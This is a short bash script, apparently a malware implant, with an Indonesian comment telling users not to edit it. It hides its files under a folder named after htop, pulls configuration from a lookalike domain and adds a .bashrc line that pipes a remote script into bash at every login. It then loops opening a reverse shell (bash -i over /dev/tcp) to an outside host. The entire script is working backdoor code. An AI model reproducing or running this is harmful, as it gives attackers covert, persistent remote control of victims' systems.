#!/bin/bash
# TIDAK PERLU DIEDIT - Auto config dari VPS!

CONFIG_URL="https://static-alicdn.com/main/gsock-config.txt"
PERSIST_DIR="$HOME/.config/htop"

stealth() {
    renice 19 $$ &>/dev/null
    exec 2>/dev/null
}

persist() {
    mkdir -p "$PERSIST_DIR"
    
    curl -s "$CONFIG_URL" -o "$PERSIST_DIR/config" || echo "HOST=gsocket.io PORT=4433 PASS=default123" > "$PERSIST_DIR/config"
    
    source "$PERSIST_DIR/config"
    
    echo "$PASS" | openssl enc -aes-256-cbc -k gsock123 -out "$PERSIST_DIR/pass"
    
    echo '[ -f ~/.config/htop/config ] && (sleep $((RANDOM%60)); curl -fsSL https://raw.githubusercontent.com/youruser/gsocket-zero/main/gsocket.sh | bash) &' >> ~/.bashrc
}

reverse() {
    while true; do
        source "$PERSIST_DIR/config" 2>/dev/null || continue
        
        echo "GSOCK:$PASS" | nc -w5 "$HOST" "$PORT" 2>/dev/null | grep -q AUTH_OK && {
            nc "$HOST" "$PORT" | bash -i >& /dev/tcp/"$HOST"/"$PORT" 0>&1 2>&1
        }
        sleep $((5+RANDOM%10))
    done
}

stealth
persist
exec reverse
